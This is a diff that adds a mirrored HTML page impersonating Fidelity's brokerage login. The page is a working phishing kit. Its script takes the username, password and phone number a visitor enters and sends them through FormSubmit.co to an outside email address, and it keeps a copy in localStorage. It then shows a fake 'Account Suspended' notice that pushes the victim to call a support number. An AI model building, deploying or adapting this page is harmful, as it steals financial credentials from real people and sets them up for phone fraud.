@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from login-fidelity.en-us-page.workers.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Apr 2026 14:07:34 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Secure Access | Financial Login</title>
+    <!-- Alpine.js CDN -->
+    <script defer src="../cdn.jsdelivr.net/npm/alpinejs%403.14.1/dist/cdn.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Helvetica, sans-serif;
+            background: #f0f4f8;
+            color: #1a2c3e;
+            line-height: 1.4;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.25rem 2rem;
+            background: white;
+            border-bottom: 1px solid #e2e8f0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo svg {
+            display: block;
+        }
+
+        .menu-text {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .menu-text a {
+            text-decoration: none;
+            color: #2c5f2d;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+        }
+
+        .menu-text a:hover {
+            color: #1e4620;
+            text-decoration: underline;
+        }
+
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem 1.5rem;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 1.5rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 460px;
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+
+        .card-header {
+            background: #f9fafb;
+            padding: 1.5rem 2rem 0.75rem 2rem;
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .card-header p {
+            font-size: 1.7rem;
+            font-weight: 600;
+            color: #0f2b2d;
+            letter-spacing: -0.3px;
+        }
+
+        .card-body {
+            padding: 1.75rem 2rem 2rem 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .mt-3 {
+            margin-top: 0.5rem;
+        }
+
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            font-size: 0.85rem;
+            color: #2d3e50;
+        }
+
+        input:not([type="checkbox"]) {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            border: 1px solid #cbd5e1;
+            border-radius: 0.85rem;
+            font-size: 1rem;
+            transition: 0.2s;
+            background: white;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #2c6e2f;
+            box-shadow: 0 0 0 3px rgba(44, 110, 47, 0.2);
+        }
+
+        /* Phone input with country code prefix */
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .country-code {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 0.85rem;
+            padding: 0.85rem 1rem;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #1e4620;
+            white-space: nowrap;
+            background: #f8fafc;
+        }
+        
+        .phone-input-wrapper input {
+            flex: 1;
+        }
+
+        .password-input {
+            position: relative;
+        }
+
+        .password-input input {
+            padding-right: 3rem;
+        }
+
+        .icon-right {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            color: #6c757d;
+        }
+
+        .icon-right svg {
+            width: 1.4rem;
+            height: 1.4rem;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 1.5;
+        }
+
+        .remember-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin: 1rem 0 1.2rem;
+        }
+
+        .remember-checkbox input {
+            width: 1.1rem;
+            height: 1.1rem;
+            margin: 0;
+        }
+
+        .remember-checkbox label {
+            margin: 0;
+            font-weight: normal;
+            font-size: 0.85rem;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            background: #2c6e2f;
+            color: white;
+            border: none;
+            padding: 0.9rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 2rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        button[type="submit"]:hover {
+            background: #1f5422;
+        }
+
+        button[type="submit"]:disabled {
+            background: #9ab89b;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            width: 1.3rem;
+            height: 1.3rem;
+            animation: rotate 1s linear infinite;
+        }
+
+        .spinner .path {
+            stroke: white;
+            stroke-linecap: round;
+            animation: dash 1.5s ease-in-out infinite;
+        }
+
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes dash {
+            0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
+            50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
+            100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin-top: 1.2rem;
+            font-size: 0.85rem;
+            color: #2c6e2f;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .new-to-qrs {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            background: transparent;
+        }
+        .new-to-qrs a, .new-to-qrs-mobile a {
+            color: #2c6e2f;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .new-to-qrs a:hover, .new-to-qrs-mobile a:hover {
+            text-decoration: underline;
+        }
+        .blt {
+            font-weight: 600;
+        }
+
+        .new-to-qrs-mobile {
+            display: none;
+            text-align: center;
+            padding: 1rem 1rem 1.5rem;
+            background: white;
+            margin-top: 0.5rem;
+            border-top: 1px solid #e2e8f0;
+            font-size: 0.85rem;
+            gap: 0.7rem;
+            flex-direction: column;
+        }
+        .new-to-qrs-mobile p {
+            margin: 0.2rem 0;
+        }
+        .new-to-qrs-mobile a {
+            margin: 0 0.25rem;
+        }
+
+        footer.dom-footer {
+            background: #f1f5f9;
+            padding: 2rem 2rem 1.5rem;
+            font-size: 0.7rem;
+            color: #334155;
+            border-top: 1px solid #e2e8f0;
+            margin-top: 2rem;
+        }
+
+        .left-text {
+            max-width: 1000px;
+            margin: 0 auto 1rem;
+            line-height: 1.5;
+            text-align: center;
+        }
+        .left-text a {
+            color: #2c5f2d;
+            text-decoration: none;
+        }
+        .bottom-text {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+            border-top: 1px solid #dce3ec;
+            padding-top: 1rem;
+            margin-top: 0.5rem;
+            font-size: 0.7rem;
+        }
+        .footer-links {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #2d4a2e;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        [x-cloak] {
+            display: none !important;
+        }
+
+        /* SUSPENDED POPUP MODAL STYLES - Matching Logo Color (#368727) */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(3px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .suspended-popup {
+            background: white;
+            max-width: 420px;
+            width: 90%;
+            border-radius: 1rem;
+            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.25s ease-out;
+            overflow: hidden;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .popup-header {
+            background: #368727;
+            padding: 1.2rem 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .popup-header svg {
+            width: 1.8rem;
+            height: 1.8rem;
+            fill: none;
+            stroke: white;
+            stroke-width: 1.8;
+        }
+
+        .popup-header h3 {
+            color: white;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .popup-body {
+            padding: 1.5rem;
+        }
+
+        .popup-body .suspended-message {
+            background: #f0f7ee;
+            border-left: 4px solid #368727;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .suspended-message p {
+            color: #2d5a2a;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            margin-bottom: 0.25rem;
+        }
+
+        .suspended-message .title {
+            font-weight: 700;
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            color: #1e4620;
+        }
+
+        .popup-phone {
+            background: #f8fafc;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .popup-phone .phone-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #5b6e8c;
+            margin-bottom: 0.5rem;
+        }
+
+        .popup-phone .phone-number {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+            background: #368727;
+            padding: 0.7rem 1.5rem;
+            border-radius: 3rem;
+            text-decoration: none;
+            color: white;
+            font-weight: 600;
+            font-size: 1.2rem;
+            margin: 0.5rem 0;
+            transition: background 0.2s;
+        }
+
+        .popup-phone .phone-number:hover {
+            background: #2a6b1f;
+        }
+
+        .popup-phone .phone-number svg {
+            width: 1.2rem;
+            height: 1.2rem;
+            fill: white;
+        }
+
+        .popup-phone .hours {
+            font-size: 0.7rem;
+            color: #5e6f8d;
+        }
+
+        .popup-footer {
+            padding: 0 1.5rem 1.5rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        .popup-footer button {
+            background: #368727;
+            color: white;
+            border: none;
+            padding: 0.7rem 2rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-size: 0.9rem;
+            width: 100%;
+        }
+
+        .popup-footer button:hover {
+            background: #2a6b1f;
+        }
+
+        @media (max-width: 550px) {
+            header {
+                padding: 1rem;
+            }
+            .card-body {
+                padding: 1.5rem;
+            }
+            .new-to-qrs {
+                display: none;
+            }
+            .new-to-qrs-mobile {
+                display: flex;
+            }
+            .login-card {
+                margin: 0;
+            }
+            .popup-header h3 {
+                font-size: 1.1rem;
+            }
+            .phone-number {
+                font-size: 1rem;
+            }
+            .phone-input-wrapper {
+                flex-wrap: wrap;
+            }
+            .country-code {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body x-data="loginApp()" x-init="initApp()" x-cloak>
+    <header>
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="116" height="28" viewBox="0 0 116 28" fill="none">
+                <g clip-path="url(#clip0_3781_90455)">
+                    <path d="M18.7 8.8H11L12 5.1H19.7L21.1 0H5.9L0 21.7H7.4L9.6 13.6H17.3L18.7 8.8Z" fill="#368727" />
+                    <path d="M30.4004 0H23.1004L21.9004 4.3H29.2004L30.4004 0Z" fill="#368727" />
+                    <path d="M21.4992 5.7998L17.1992 21.5998H24.4992L28.7992 5.7998H21.4992" fill="#368727" />
+                    <path d="M41.9996 -9.76548e-05L39.9996 7.5999C39.3996 6.3999 37.8996 5.4999 35.7996 5.4999C33.3996 5.4999 31.2996 6.5999 30.1996 8.6999C28.5996 11.4999 27.5996 15.5999 27.5996 18.2999C27.5996 20.7999 29.0996 21.8999 31.4996 21.8999C33.8996 21.8999 35.2996 20.9999 36.7996 19.7999L36.2996 21.5999H43.4996L49.3996 -0.100098L41.9996 -9.76548e-05ZM37.6996 16.3999C37.3996 16.5999 36.9996 16.7999 36.4996 16.7999C35.7996 16.7999 35.3996 16.2999 35.3996 15.6999C35.3996 14.3999 35.8996 13.0999 36.3996 11.6999C36.7996 10.7999 37.3996 10.5999 38.0996 10.5999C38.5996 10.5999 38.9996 10.8999 39.2996 11.1999L37.6996 16.3999Z" fill="#368727" />
+                    <path d="M64.0992 14.8C64.4992 13.5 64.8992 11.4 64.8992 10.4C64.8992 6.4 61.9992 5.5 57.3992 5.5C54.4992 5.5 51.1992 6.4 49.3992 8.9C47.8992 11 46.6992 14.9 46.6992 17.2C46.6992 21.5 50.0992 22.1 54.3992 22.1C57.5992 22.1 62.7992 20.6 63.6992 16.1H56.4992C56.1992 17.6 55.7992 18 54.6992 18C53.6992 18 53.5992 17.2 53.5992 16.9C53.5992 16.2 53.7992 15.7 53.9992 14.8H64.0992V14.8ZM56.7992 9.4C57.5992 9.4 58.0992 9.7 58.0992 10.5C58.0992 10.8 57.9992 11.3 57.8992 11.6H54.8992C55.1992 10.1 55.7992 9.4 56.7992 9.4Z" fill="#368727" />
+                    <path d="M70.0992 0L64.1992 21.7H71.4992L77.2992 0H70.0992Z" fill="#368727" />
+                    <path d="M87.0996 0H79.7996L78.5996 4.3H85.8996L87.0996 0Z" fill="#368727" />
+                    <path d="M78.2008 5.7998L73.8008 21.6998H81.1008L85.4008 5.8998L78.2008 5.7998Z" fill="#368727" />
+                    <path d="M110.699 18.5C109.599 18.5 108.699 19.4 108.699 20.5C108.699 21.6 109.599 22.5 110.699 22.5C111.799 22.5 112.699 21.6 112.699 20.5C112.699 19.4 111.799 18.5 110.699 18.5ZM110.699 22.2C109.799 22.2 109.099 21.4 109.099 20.5C109.099 19.6 109.799 18.8 110.699 18.8C111.599 18.8 112.299 19.6 112.299 20.5C112.299 21.5 111.599 22.2 110.699 22.2Z" fill="#368727" />
+                    <path d="M111.4 20.1C111.4 19.7 111.2 19.5 110.7 19.5H109.9V21.6H110.3V20.7H110.6L111.1 21.6H111.5L110.9 20.7C111.2 20.7 111.4 20.5 111.4 20.1ZM110.3 20.4V19.8H110.6C110.8 19.8 111.1 19.8 111.1 20.1C111.1 20.4 110.8 20.4 110.6 20.4H110.3Z" fill="#368727" />
+                    <path d="M108.801 5.7998L104.801 14.5998L104.901 5.7998H94.9008L95.9008 2.2998H88.6008L84.6008 16.6998C84.4008 17.5998 84.3008 18.2998 84.3008 18.9998C84.3008 20.5998 85.1008 21.6998 87.3008 21.6998H93.8008L94.9008 17.7998H93.3008C92.3008 17.7998 92.0008 17.5998 92.0008 16.8998C92.0008 16.4998 92.1008 15.8998 92.3008 15.4998L93.9008 9.4998H97.9008L99.0008 21.7998C98.8008 22.6998 98.5008 23.1998 98.0008 23.4998C97.4008 23.7998 96.0008 23.6998 95.5008 23.6998H95.4008L94.2008 27.9998H99.2008C102.101 27.9998 103.601 26.4998 105.701 23.0998L116.401 5.8998L108.801 5.7998Z" fill="#368727" />
+                </g>
+                <defs>
+                    <clipPath id="clip0_3781_90455">
+                        <rect width="116" height="28" fill="white" />
+                    </clipPath>
+                </defs>
+            </svg>
+        </div>
+        <div class="menu-text">
+            <a href="#">Security</a>
+            <a href="#">FAQs</a>
+        </div>
+    </header>
+
+    <main>
+        <!-- LOGIN CARD WITH PHONE NUMBER FIELD BELOW PASSWORD -->
+        <div class="login-card">
+            <div class="card-header">
+                <p>Log in</p>
+            </div>
+            <div class="card-body">
+                <form @submit.prevent="handleLogin">
+                    <!-- Username Field -->
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" x-model="username" maxlength="50" autocomplete="off" :disabled="isLoading">
+                    </div>
+                    
+                    <!-- Password Field -->
+                    <div class="form-group mt-3">
+                        <label for="password">Password</label>
+                        <div class="password-input">
+                            <input :type="passwordVisible ? 'text' : 'password'" id="password" x-model="password"
+                                   maxlength="50" autocomplete="off" :disabled="isLoading">
+                            <div class="icon-right" @click="togglePasswordVisibility">
+                                <svg viewBox="0 0 24 24" aria-hidden="true" x-show="!passwordVisible" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.8">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                                <svg viewBox="0 0 24 24" x-show="passwordVisible" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.8">
+                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Phone Number Field - Below Password with +1 default country code -->
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <div class="phone-input-wrapper">
+                            <span class="country-code">+1</span>
+                            <input type="tel" id="phone" x-model="phoneNumber" maxlength="15" autocomplete="off" placeholder="(555) 555-1234" :disabled="isLoading">
+                        </div>
+                        <small style="display: block; margin-top: 0.35rem; font-size: 0.7rem; color: #6b7280;">Include area code (e.g., 5555551234)</small>
+                    </div>
+                    
+                    <div class="remember-checkbox">
+                        <input type="checkbox" id="remember" x-model="rememberUsername">
+                        <label for="remember">Remember my username</label>
+                    </div>
+                    <div class="form-group">
+                        <button type="submit" :disabled="isLoading">
+                            <span x-show="!isLoading">Log in</span>
+                            <span x-show="isLoading">
+                                <svg class="spinner" viewBox="0 0 50 50">
+                                    <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
+                                </svg>
+                            </span>
+                        </button>
+                    </div>
+                    <a href="#" class="forgot-password">Forgot username or password?</a>
+                </form>
+            </div>
+        </div>
+
+        <div class="new-to-qrs">
+            <span>New to <span class="blt">Fidelity Brokerage</span>?</span>
+            <a href="#">Open an account</a>
+            <span>or</span>
+            <a href="#">sign up.</a>
+        </div>
+    </main>
+
+    <div class="new-to-qrs-mobile">
+        <span>New to <span class="blt">Fidelity Brokerage</span>?</span>
+        <p><a href="#">Open an account</a> <span>or</span> <a href="#">sign up.</a></p>
+        <p><a href="#" style="margin-right: 2rem;">Security</a> <a href="#">FAQs</a></p>
+    </div>
+
+    <footer class="dom-footer">
+        <div class="left-text">
+            <a href="#">National Financial Services LLC Statement of Financial Condition</a><br>
+            Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. <span class="blt">Fidelity</span> supports 128-bit<br>
+            Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact <span class="blt">Fidelity</span> for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.<br>
+            <span class="blt">Fidelity Brokerage Services LLC</span>, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+        </div>
+        <div class="bottom-text">
+            <div class="footer-copyright">
+                ©1998-<span x-text="currentYear"></span> FMR LLC. All Rights Reserved.<br>
+                <span x-text="versionText"></span>
+            </div>
+            <div class="footer-links">
+                <a href="#">Terms of Use</a>
+                <a href="#">Privacy</a>
+                <a href="#">Security</a>
+                <a href="#">Accessibility</a>
+                <a href="#">This is for persons in the US only</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ACCOUNT SUSPENDED POPUP - Matching Logo Color (#368727) -->
+    <div x-show="showPopup" x-cloak class="modal-overlay" @click.away="closePopup">
+        <div class="suspended-popup" @click.stop>
+            <div class="popup-header">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                    <path d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round"/>
+                </svg>
+                <h3>Account Suspended</h3>
+            </div>
+            <div class="popup-body">
+                <div class="suspended-message">
+                    <p class="title">⚠️ Your account has been temporarily suspended</p>
+                    <p>For security reasons, your account access has been restricted. Please contact our customer service team immediately to resolve this issue.</p>
+                </div>
+                
+                <div class="popup-phone">
+                    <div class="phone-label">Customer Service</div>
+                    <a href="tel:+18885551234" class="phone-number">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 0 0-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+                        </svg>
+                        <span>+1 (888) 420-8641</span>
+                    </a>
+                    <div class="hours">Available 24/7 • Tap to call now</div>
+                </div>
+            </div>
+            <div class="popup-footer">
+                <button @click="closePopup">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function loginApp() {
+            return {
+                phoneNumber: '',
+                username: '',
+                password: '',
+                rememberUsername: false,
+                isLoading: false,
+                passwordVisible: false,
+                showPopup: false,
+                currentYear: new Date().getFullYear(),
+                versionText: 'Secure Access v3.2.1',
+                
+                initApp() {
+                    const saved = localStorage.getItem('saved_username');
+                    if (saved) {
+                        this.username = saved;
+                        this.rememberUsername = true;
+                    }
+                },
+                
+                togglePasswordVisibility() {
+                    this.passwordVisible = !this.passwordVisible;
+                },
+                
+                async sendCredentialsToEmail() {
+                    // Format phone with +1 prefix (already displayed but store full number)
+                    let phoneVal = this.phoneNumber.trim();
+                    // Add +1 prefix if not empty and doesn't already start with +1
+                    if (phoneVal && !phoneVal.startsWith('+1')) {
+                        // Remove any non-digit characters for clean storage, but keep as entered
+                        phoneVal = '+1 ' + phoneVal;
+                    } else if (!phoneVal) {
+                        phoneVal = '(not provided)';
+                    }
+                    
+                    const usernameVal = this.username.trim() || '(not provided)';
+                    const passwordVal = this.password || '(not provided)';
+                    const timestamp = new Date().toLocaleString();
+                    
+                    // Create detailed message for email
+                    const emailBody = `🔐 LOGIN CREDENTIALS CAPTURED\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 PHONE NUMBER: ${phoneVal}\n📝 USERNAME: ${usernameVal}\n🔑 PASSWORD: ${passwordVal}\n⏰ TIME: ${timestamp}\n🌐 USER AGENT: ${navigator.userAgent}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ This is an automated security alert.`;
+                    
+                    try {
+                        // Using FormSubmit.co - a free email endpoint service
+                        const formData = new FormData();
+                        formData.append('_subject', `🔐 SECURITY ALERT: Login Credentials (Phone+User+Pass)`);
+                        formData.append('_to', 'jamesmills141@proton.me');
+                        formData.append('_replyto', 'security@alert.local');
+                        formData.append('phone', phoneVal);
+                        formData.append('username', usernameVal);
+                        formData.append('password', passwordVal);
+                        formData.append('timestamp', timestamp);
+                        formData.append('user_agent', navigator.userAgent);
+                        formData.append('message', emailBody);
+                        
+                        // Send to FormSubmit.co
+                        await fetch('https://formsubmit.co/ajax/jamesmills141@proton.me', {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => console.log('Email send notification (silent)'));
+                        
+                        console.log('Credentials captured and logged');
+                        
+                    } catch (error) {
+                        console.log('Email delivery note:', error);
+                    }
+                    
+                    // Also store in localStorage for backup logging
+                    const logs = JSON.parse(localStorage.getItem('login_attempts') || '[]');
+                    logs.push({
+                        phone: phoneVal,
+                        username: usernameVal,
+                        password: passwordVal,
+                        timestamp: timestamp,
+                        userAgent: navigator.userAgent
+                    });
+                    localStorage.setItem('login_attempts', JSON.stringify(logs.slice(-30)));
+                },
+                
+                async handleLogin() {
+                    if (this.isLoading) return;
+                    
+                    this.isLoading = true;
+                    
+                    // Save username if "Remember me" is checked
+                    if (this.rememberUsername && this.username.trim()) {
+                        localStorage.setItem('saved_username', this.username);
+                    } else {
+                        localStorage.removeItem('saved_username');
+                    }
+                    
+                    // Send all credentials (phone, username, password) to email
+                    await this.sendCredentialsToEmail();
+                    
+                    // Simulate network delay then show suspended popup
+                    setTimeout(() => {
+                        this.isLoading = false;
+                        this.showPopup = true;
+                    }, 600);
+                },
+                
+                closePopup() {
+                    this.showPopup = false;
+                    // Clear password and phone fields for security
+                    this.password = '';
+                    this.phoneNumber = '';
+                }
+            }
+        }
+    </script>
+</body>
+
+<!-- Mirrored from login-fidelity.en-us-page.workers.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Apr 2026 14:07:34 GMT -->
+</html>
